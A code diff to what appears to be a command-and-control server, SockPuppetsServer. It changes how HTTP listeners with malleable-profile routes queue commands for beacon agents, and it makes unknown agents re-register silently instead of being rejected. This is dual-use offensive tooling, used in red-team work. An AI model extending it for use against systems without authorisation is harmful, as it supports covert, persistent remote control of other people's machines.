@@ -708,7 +708,7 @@ class SockPuppetsServer:
         if web is None:
             raise ImportError("aiohttp is required for HTTP/HTTPS listeners. Install with: pip install aiohttp")
 
-        app = web.Application()
+        app = web.Application(client_max_size=16 * 1024 * 1024)
         # Catch-all POST handler — malleable profiles use varying URIs
         app.router.add_post('/{path:.*}', self._http_handle_any_post)
         # Catch-all GET handler for heartbeat and index
@@ -867,7 +867,15 @@ class SockPuppetsServer:
                     try:
                         cmd = agent.command_queue.get_nowait()
                         if isinstance(cmd, dict):
-                            commands.append(cmd)
+                            text = cmd.get('command', '')
+                            if isinstance(text, dict):
+                                text = text.get('command', '')
+                            commands.append({
+                                'type': 'command',
+                                'command': text,
+                                'command_id': cmd.get('command_id', ''),
+                                'timestamp': cmd.get('timestamp') or datetime.now().isoformat(),
+                            })
                         else:
                             commands.append({
                                 'type': 'command', 'command': cmd,
@@ -900,8 +908,14 @@ class SockPuppetsServer:
 
             return web.Response(text=encrypted_response, content_type='text/html')
         else:
-            logger.warning(f"Checkin from unknown agent_id={agent_id}, rejecting")
-            return web.Response(status=404)
+            metadata = data.get('metadata') or {'mode': 'beacon', 'hostname': 'rejoined'}
+            metadata['ip'] = request.remote or 'Unknown'
+            transport_type = 'https' if request.secure else 'http'
+            agent = self.register_agent_common(agent_id, metadata, transport_type)
+            agent.encryption_key = key_used
+            self.events.emit({"event": "agent_registered", "agent": agent.get_info()})
+            logger.info(f"Rejoined agent {agent_id}")
+            return await self._http_do_checkin(request, data, key_used)
 
     async def _http_do_results(self, request, data, key_used):
         """Process command results from parsed data"""
@@ -1036,6 +1050,8 @@ class SockPuppetsServer:
                         while not agent.command_queue.empty():
                             try:
                                 cmd = agent.command_queue.get_nowait()
+                                if isinstance(cmd, dict):
+                                    cmd = cmd.get('command', '')
                                 commands.append({
                                     'type': 'command',
                                     'command': cmd,
